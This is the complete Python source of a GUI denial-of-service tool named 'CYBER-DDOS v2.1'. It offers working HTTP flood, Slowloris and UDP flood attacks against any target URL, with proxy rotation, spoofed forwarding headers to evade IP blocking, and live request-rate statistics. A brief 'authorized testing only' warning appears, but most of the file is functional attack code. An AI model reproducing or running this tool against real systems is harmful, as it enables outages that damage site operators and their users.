import requests
import threading
import time
import random
import json
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from requests.exceptions import RequestException
from datetime import datetime
from itertools import cycle
import socket
import socks
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import matplotlib.pyplot as plt
import matplotlib.animation as animation
import concurrent.futures

# Global control flags
running = False
total_requests = 0
success_count = 0
error_count = 0
request_timeline = []

# Hacker theme configuration
DARK_THEME = {
    "bg": "#0A0A0A",
    "fg": "#00FF00",
    "accent": "#00CC00",
    "secondary": "#1A1A1A",
    "font": ("Courier New", 10),
    "error": "#FF4444",
    "warning": "#FFAA00",
    "graph_bg": "#001100",
    "graph_fg": "#00FF00"
}

# Expanded user agents and proxy templates
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15"
]

proxy_templates = [
    "{}:{}",  # IP:PORT
    "socks5://{}:{}",
    "http://user-{}:pass-{}@{}:{}"
]

class AdvancedTrafficGenerator:
    def __init__(self, root):
        self.root = root
        self.proxy_pool = []
        self.proxy_cycle = None
        self.config = {}
        self.rps_history = []  # To store RPS data for graphing
        self.setup_gui()
        self.load_default_config()
        self.setup_dummy_proxies()
        self.setup_animation()

    def setup_gui(self):
        self.root.title("CYBER-DDOS v2.1 - Advanced")
        self.root.geometry("1280x800")
        self.root.configure(bg=DARK_THEME["bg"])

        # **Menu System**
        self.menu_bar = tk.Menu(self.root, bg=DARK_THEME["secondary"], fg=DARK_THEME["fg"])
        file_menu = tk.Menu(self.menu_bar, tearoff=0, bg=DARK_THEME["secondary"], fg=DARK_THEME["fg"])
        file_menu.add_command(label="Load Config", command=self.load_config)
        file_menu.add_command(label="Save Config", command=self.save_config)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        self.menu_bar.add_cascade(label="File", menu=file_menu)

        help_menu = tk.Menu(self.menu_bar, tearoff=0, bg=DARK_THEME["secondary"], fg=DARK_THEME["fg"])
        help_menu.add_command(label="Instructions", command=self.show_instructions)
        self.menu_bar.add_cascade(label="Help", menu=help_menu)
        self.root.config(menu=self.menu_bar)

        # **Notebook (Tabs)**
        style = ttk.Style()
        style.theme_create("hacker", settings={
            "TNotebook": {"configure": {"background": DARK_THEME["bg"]}},
            "TNotebook.Tab": {"configure": {"padding": [10, 5], "background": DARK_THEME["secondary"], "foreground": DARK_THEME["fg"]}}
        })
        style.theme_use("hacker")
        
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Configuration Tab
        self.config_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.config_frame, text="[CONFIGURATION]")
        self.create_config_tab()

        # Statistics Tab
        self.stats_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.stats_frame, text="[STATISTICS]")
        self.create_stats_tab()

        # Logs Tab
        self.logs_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.logs_frame, text="[LOGS]")
        self.create_logs_tab()

        # **Status Bar**
        self.status_var = tk.StringVar()
        self.status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W,
                                    background=DARK_THEME["secondary"], foreground=DARK_THEME["fg"])
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def create_config_tab(self):
        # **Attack Configuration**
        ttk.Label(self.config_frame, text="Target URL:", style="Hacker.TLabel").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.url_entry = ttk.Entry(self.config_frame, width=60, style="Hacker.TEntry")
        self.url_entry.grid(row=0, column=1, columnspan=2, padx=5, pady=5, sticky="we")

        ttk.Label(self.config_frame, text="Threads:", style="Hacker.TLabel").grid(row=1, column=0, padx=5, pady=5, sticky="e")
        self.thread_entry = ttk.Entry(self.config_frame, width=10, style="Hacker.TEntry")
        self.thread_entry.grid(row=1, column=1, padx=5, pady=5, sticky="w")

        ttk.Label(self.config_frame, text="Duration (seconds):", style="Hacker.TLabel").grid(row=1, column=2, padx=5, pady=5, sticky="e")
        self.duration_entry = ttk.Entry(self.config_frame, width=10, style="Hacker.TEntry")
        self.duration_entry.grid(row=1, column=3, padx=5, pady=5, sticky="w")
        self.duration_entry.insert(0, "60")

        ttk.Label(self.config_frame, text="Attack Type:", style="Hacker.TLabel").grid(row=2, column=0, padx=5, pady=5, sticky="e")
        self.attack_type = ttk.Combobox(self.config_frame, values=["HTTP Flood", "Slowloris", "UDP Flood"], 
                                        state="readonly", style="Hacker.TCombobox")
        self.attack_type.grid(row=2, column=1, padx=5, pady=5, sticky="w")
        self.attack_type.current(0)
        self.attack_type.bind("<<ComboboxSelected>>", self.update_attack_settings)

        ttk.Label(self.config_frame, text="Max RPS per thread:", style="Hacker.TLabel").grid(row=2, column=2, padx=5, pady=5, sticky="e")
        self.rps_entry = ttk.Entry(self.config_frame, width=10, style="Hacker.TEntry")
        self.rps_entry.grid(row=2, column=3, padx=5, pady=5, sticky="w")
        self.rps_entry.insert(0, "10")

        # **UDP Flood Specific Settings**
        self.udp_settings_frame = ttk.Frame(self.config_frame)
        self.udp_settings_frame.grid(row=3, column=0, columnspan=4, sticky="we")

        ttk.Label(self.udp_settings_frame, text="Packet Size (bytes):", style="Hacker.TLabel").grid(row=0, column=0, padx=5, pady=5, sticky="e")
        self.packet_size_entry = ttk.Entry(self.udp_settings_frame, width=10, state=tk.DISABLED, style="Hacker.TEntry")
        self.packet_size_entry.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        self.packet_size_entry.insert(0, "1024")

        ttk.Label(self.udp_settings_frame, text="Target Port:", style="Hacker.TLabel").grid(row=0, column=2, padx=5, pady=5, sticky="e")
        self.port_entry = ttk.Entry(self.udp_settings_frame, width=10, state=tk.DISABLED, style="Hacker.TEntry")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5, sticky="w")

        # **Proxy Management**
        self.proxy_frame = ttk.LabelFrame(self.config_frame, text="Proxy Management", style="Hacker.TLabelframe")
        self.proxy_frame.grid(row=4, column=0, columnspan=4, padx=5, pady=5, sticky="we")
        self.proxy_list = tk.Listbox(self.proxy_frame, height=5, width=80, bg=DARK_THEME["secondary"], 
                                     fg=DARK_THEME["fg"], font=DARK_THEME["font"])
        self.proxy_list.pack(side=tk.LEFT, padx=5, pady=5)
        btn_frame = ttk.Frame(self.proxy_frame)
        btn_frame.pack(side=tk.RIGHT, padx=5)
        ttk.Button(btn_frame, text="Load Proxies", command=self.load_proxies, style="Hacker.TButton").pack(pady=2)
        ttk.Button(btn_frame, text="Validate Proxies", command=self.validate_proxies, style="Hacker.TButton").pack(pady=2)
        ttk.Button(btn_frame, text="Generate Dummy", command=self.setup_dummy_proxies, style="Hacker.TButton").pack(pady=2)
        ttk.Button(btn_frame, text="Clear Proxies", command=self.clear_proxies, style="Hacker.TButton").pack(pady=2)

        # **Control Buttons**
        btn_frame = ttk.Frame(self.config_frame)
        btn_frame.grid(row=5, column=0, columnspan=4, pady=10)
        ttk.Button(btn_frame, text="Start Attack", command=self.start_attack, style="Hacker.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Stop Attack", command=self.stop_attack, style="Hacker.TButton").pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Advanced Settings", command=self.show_advanced, style="Hacker.TButton").pack(side=tk.LEFT, padx=5)

        # **Ethical Disclaimer**
        ttk.Label(self.config_frame, text="WARNING: For educational and authorized testing only.", 
                  foreground=DARK_THEME["error"], style="Hacker.TLabel").grid(row=6, column=0, columnspan=4, pady=10)

        self.update_attack_settings(None)

    def create_stats_tab(self):
        stats = ["Total Requests", "Success Rate", "Active Connections", "Errors", "RPS"]
        self.stats_vars = {stat: tk.StringVar(value="0") for stat in stats}
        
        for idx, stat in enumerate(stats):
            ttk.Label(self.stats_frame, text=stat, style="Hacker.TLabel").grid(row=idx, column=0, padx=10, pady=5, sticky="e")
            ttk.Label(self.stats_frame, textvariable=self.stats_vars[stat], style="Hacker.TLabel").grid(row=idx, column=1, padx=10, pady=5, sticky="w")

        self.fig = plt.Figure(facecolor=DARK_THEME["graph_bg"])
        self.ax = self.fig.add_subplot(111)
        self.ax.set_facecolor(DARK_THEME["graph_bg"])
        self.ax.tick_params(axis='x', colors=DARK_THEME["graph_fg"])
        self.ax.tick_params(axis='y', colors=DARK_THEME["graph_fg"])
        self.line, = self.ax.plot([], [], color=DARK_THEME["accent"])
        
        self.canvas = FigureCanvasTkAgg(self.fig, self.stats_frame)
        self.canvas.get_tk_widget().grid(row=len(stats), column=0, columnspan=2, pady=10)

    def create_logs_tab(self):
        self.log_text = scrolledtext.ScrolledText(self.logs_frame, wrap=tk.WORD, bg=DARK_THEME["secondary"], 
                                                  fg=DARK_THEME["fg"], insertbackground=DARK_THEME["fg"], font=DARK_THEME["font"])
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        filter_frame = ttk.Frame(self.logs_frame)
        filter_frame.pack(fill=tk.X, padx=5)
        self.log_filter = ttk.Combobox(filter_frame, values=["All", "Success", "Errors", "Warnings"], style="Hacker.TCombobox")
        self.log_filter.set("All")
        self.log_filter.pack(side=tk.LEFT, padx=5)

    def setup_animation(self):
        self.ani = animation.FuncAnimation(self.fig, self.animate, interval=1000)

    def animate(self, i):
        self.ax.clear()
        self.ax.plot(self.rps_history, color=DARK_THEME["accent"])
        self.ax.set_facecolor(DARK_THEME["graph_bg"])
        self.ax.tick_params(colors=DARK_THEME["graph_fg"])
        self.ax.set_title("Requests Per Second (last 30s)", color=DARK_THEME["fg"])
        return self.line,

    def setup_dummy_proxies(self):
        self.proxy_pool = []
        for _ in range(50):
            ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            port = random.randint(8000, 65000)
            template = random.choice(proxy_templates)
            if template == "{}:{}" or template == "socks5://{}:{}":
                proxy = template.format(ip, port)
            elif template == "http://user-{}:pass-{}@{}:{}":
                user = random.randint(1000, 9999)
                passw = random.randint(1000, 9999)
                proxy = template.format(user, passw, ip, port)
            else:
                continue
            self.proxy_pool.append(proxy)
        self.proxy_cycle = cycle(self.proxy_pool)
        self.update_proxy_list()

    def update_proxy_list(self):
        self.proxy_list.delete(0, tk.END)
        for proxy in self.proxy_pool[-50:]:
            self.proxy_list.insert(tk.END, proxy)

    def log_message(self, message, level="info"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        tag = level.upper()
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n", tag)
        self.log_text.tag_config("INFO", foreground=DARK_THEME["fg"])
        self.log_text.tag_config("ERROR", foreground=DARK_THEME["error"])
        self.log_text.tag_config("WARNING", foreground=DARK_THEME["warning"])
        self.log_text.configure(state=tk.DISABLED)
        self.log_text.see(tk.END)
        self.update_status(f"Last event: {message}")

    def update_status(self, message):
        self.status_var.set(message)
        self.root.update_idletasks()

    def load_default_config(self):
        self.url_entry.insert(0, "https://example.com")
        self.thread_entry.insert(0, "100")
        self.attack_type.current(0)

    def load_proxies(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path) as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]
            self.proxy_cycle = cycle(self.proxy_pool)
            self.update_proxy_list()
            self.log_message(f"Loaded {len(self.proxy_pool)} proxies", "info")

    def validate_proxies(self):
        test_url = "http://example.com"
        working_proxies = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            future_to_proxy = {executor.submit(self.test_proxy, proxy, test_url): proxy for proxy in self.proxy_pool}
            for future in concurrent.futures.as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                try:
                    if future.result():
                        working_proxies.append(proxy)
                    else:
                        self.log_message(f"Proxy {proxy} failed validation", "error")
                except Exception as e:
                    self.log_message(f"Proxy {proxy} error: {e}", "error")
        self.proxy_pool = working_proxies
        self.proxy_cycle = cycle(self.proxy_pool) if working_proxies else None
        self.update_proxy_list()
        self.log_message(f"Validated {len(working_proxies)} working proxies", "info")

    def test_proxy(self, proxy, test_url):
        try:
            response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=5)
            return response.status_code == 200
        except:
            return False

    def clear_proxies(self):
        self.proxy_pool = []
        self.proxy_cycle = None
        self.update_proxy_list()
        self.log_message("Proxy list cleared", "info")

    def start_attack(self):
        global running
        if not running:
            target = self.url_entry.get()
            try:
                threads = int(self.thread_entry.get())
                if threads <= 0:
                    raise ValueError
            except ValueError:
                messagebox.showerror("Invalid Input", "Threads must be a positive integer")
                return
            if not target.startswith("http://") and not target.startswith("https://"):
                messagebox.showerror("Invalid URL", "Target URL must start with http:// or https://")
                return
            running = True
            threading.Thread(target=self.run_attack).start()
            self.log_message("Attack sequence initiated", "warning")

    def stop_attack(self):
        global running
        running = False
        self.log_message("Attack terminated", "warning")

    def run_attack(self):
        target = self.url_entry.get()
        threads = int(self.thread_entry.get())
        attack_type = self.attack_type.get()
        try:
            duration = int(self.duration_entry.get())
            if duration > 0:
                threading.Timer(duration, self.stop_attack).start()
            else:
                self.log_message("Invalid duration, attack will run until manually stopped", "warning")
        except ValueError:
            self.log_message("Invalid duration, attack will run until manually stopped", "warning")
        
        self.log_message(f"Initializing {attack_type} attack on {target} with {threads} threads", "info")
        
        for _ in range(threads):
            if attack_type == "HTTP Flood":
                threading.Thread(target=self.http_flood, daemon=True).start()
            elif attack_type == "Slowloris":
                threading.Thread(target=self.slowloris, daemon=True).start()
            elif attack_type == "UDP Flood":
                threading.Thread(target=self.udp_flood, daemon=True).start()

        self.update_stats_loop()

    def http_flood(self):
        global total_requests, success_count, error_count
        try:
            max_rps = int(self.rps_entry.get())
            if max_rps > 0:
                sleep_time = 1 / max_rps
            else:
                sleep_time = random.uniform(0.1, 0.5)
        except ValueError:
            sleep_time = random.uniform(0.1, 0.5)
        while running:
            try:
                proxy = next(self.proxy_cycle) if self.proxy_pool else None
                response = requests.get(
                    self.url_entry.get(),
                    headers=self.generate_headers(),
                    proxies={"http": proxy, "https": proxy} if proxy else None,
                    timeout=5,
                    allow_redirects=False
                )
                total_requests += 1
                request_timeline.append(time.time())
                if response.status_code == 200:
                    success_count += 1
                    self.log_message(f"Success via {proxy or 'direct'}", "info")
                else:
                    error_count += 1
                    self.log_message(f"Error {response.status_code} from server", "error")
            except RequestException as e:
                error_count += 1
                self.log_message(f"Request error: {e}", "error")
            except Exception as e:
                error_count += 1
                self.log_message(f"Unexpected error: {e}", "error")
            time.sleep(sleep_time)

    def slowloris(self):
        global total_requests, error_count
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target = self.url_entry.get().split("//")[-1].split("/")[0]
                s.connect((target, 80))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {target}\r\n".encode())
                s.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
                s.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                s.send("Connection: keep-alive\r\n\r\n".encode())
                while running:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    total_requests += 1
                    time.sleep(15)
                s.close()
            except Exception as e:
                error_count += 1
                self.log_message(f"Slowloris error: {e}", "error")
                time.sleep(1)

    def udp_flood(self):
        global total_requests, error_count
        target_domain = self.url_entry.get().split("//")[-1].split("/")[0]
        try:
            target_ip = socket.gethostbyname(target_domain)
        except socket.gaierror:
            self.log_message(f"Cannot resolve domain {target_domain}", "error")
            return
        try:
            packet_size = int(self.packet_size_entry.get())
        except ValueError:
            packet_size = 1024  # Default size
        port_str = self.port_entry.get()
        if port_str:
            try:
                port = int(port_str)
                if not 1 <= port <= 65535:
                    raise ValueError
            except ValueError:
                self.log_message("Invalid port specified, using random port", "warning")
                port = None
        else:
            port = None
        try:
            max_rps = int(self.rps_entry.get())
            if max_rps > 0:
                sleep_time = 1 / max_rps
            else:
                sleep_time = 0.001
        except ValueError:
            sleep_time = 0.001
        while running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_data = random._urandom(packet_size)
                target_port = port if port else random.randint(1, 65535)
                sock.sendto(bytes_data, (target_ip, target_port))
                total_requests += 1
                self.log_message(f"UDP packet sent to {target_ip}:{target_port}", "info")
                time.sleep(sleep_time)
            except Exception as e:
                error_count += 1
                self.log_message(f"UDP error: {e}", "error")
                time.sleep(0.1)

    def generate_headers(self):
        return {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Referer": random.choice(["https://www.google.com", "https://www.bing.com", "https://www.yahoo.com"]),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "CF-Connecting-IP": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }

    def update_stats(self):
        self.stats_vars["Total Requests"].set(total_requests)
        success_rate = (success_count / total_requests * 100) if total_requests > 0 else 0
        self.stats_vars["Success Rate"].set(f"{success_rate:.1f}%")
        self.stats_vars["Active Connections"].set(threading.active_count() - 1)
        self.stats_vars["Errors"].set(error_count)
        now = time.time()
        recent_requests = [t for t in request_timeline if now - t < 1]
        rps = len(recent_requests)
        self.stats_vars["RPS"].set(rps)
        self.rps_history.append(rps)
        if len(self.rps_history) > 30:
            self.rps_history = self.rps_history[-30:]

    def update_stats_loop(self):
        if running:
            self.update_stats()
            self.root.after(1000, self.update_stats_loop)

    def load_config(self):
        file_path = filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
        if file_path:
            with open(file_path) as f:
                self.config = json.load(f)
            self.url_entry.delete(0, tk.END)
            self.url_entry.insert(0, self.config.get("target", ""))
            self.thread_entry.delete(0, tk.END)
            self.thread_entry.insert(0, self.config.get("threads", "100"))
            self.attack_type.set(self.config.get("attack_type", "HTTP Flood"))
            self.proxy_pool = self.config.get("proxies", [])
            self.proxy_cycle = cycle(self.proxy_pool) if self.proxy_pool else None
            self.update_proxy_list()
            self.log_message("Configuration loaded", "info")

    def save_config(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
        if file_path:
            config_data = {
                "target": self.url_entry.get(),
                "threads": self.thread_entry.get(),
                "attack_type": self.attack_type.get(),
                "proxies": self.proxy_pool
            }
            with open(file_path, "w") as f:
                json.dump(config_data, f, indent=4)
            self.log_message("Configuration saved", "info")

    def show_advanced(self):
        messagebox.showinfo("Advanced Settings", "Advanced settings not yet implemented.")

    def show_instructions(self):
        instructions = """
        CYBER-DDOS v2.1 - Advanced Traffic Generator
        Dev : Shiboshree Roy
        WARNING: This tool is for educational and authorized testing purposes only.
        Unauthorized use is illegal and unethical.

        **Configuration:**
        - **Target URL**: The URL of the target server (http:// or https://).
        - **Threads**: Number of concurrent threads to use.
        - **Duration**: Attack duration in seconds.
        - **Attack Type**: Select from HTTP Flood, Slowloris, or UDP Flood.
        - **Max RPS per thread**: Maximum requests/packets per second per thread.
        - **For UDP Flood:**
            - **Packet Size**: Size of UDP packets in bytes (e.g., 1024).
            - **Target Port**: Specific port to target (leave blank for random).

        **Proxy Management:**
        - **Load Proxies**: Load proxies from a text file.
        - **Validate Proxies**: Test and filter working proxies.
        - **Generate Dummy**: Create random dummy proxies for testing.
        - **Clear Proxies**: Remove all loaded proxies.

        **Control:**
        - **Start Attack**: Begin the attack with current settings.
        - **Stop Attack**: Terminate the ongoing attack.
        - **Advanced Settings**: (Not implemented yet)

        **Statistics:**
        - Displays real-time stats and a graph of requests per second.

        **Logs:**
        - Shows detailed event logs during the attack.
        """
        messagebox.showinfo("Instructions", instructions)

    def update_attack_settings(self, event):
        attack_type = self.attack_type.get()
        if attack_type == "UDP Flood":
            self.packet_size_entry.config(state=tk.NORMAL)
            self.port_entry.config(state=tk.NORMAL)
        else:
            self.packet_size_entry.config(state=tk.DISABLED)
            self.port_entry.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    style = ttk.Style()
    style.configure("Hacker.TLabel", background=DARK_THEME["bg"], foreground=DARK_THEME["fg"])
    style.configure("Hacker.TEntry", fieldbackground=DARK_THEME["secondary"], foreground=DARK_THEME["fg"])
    style.configure("Hacker.TButton", background=DARK_THEME["secondary"], foreground=DARK_THEME["fg"], padding=5)
    style.map("Hacker.TButton", background=[("active", DARK_THEME["accent"])])
    style.configure("Hacker.TCombobox", fieldbackground=DARK_THEME["secondary"], foreground=DARK_THEME["fg"])
    style.configure("Hacker.TLabelframe", background=DARK_THEME["bg"], foreground=DARK_THEME["fg"])
    app = AdvancedTrafficGenerator(root)
    root.mainloop()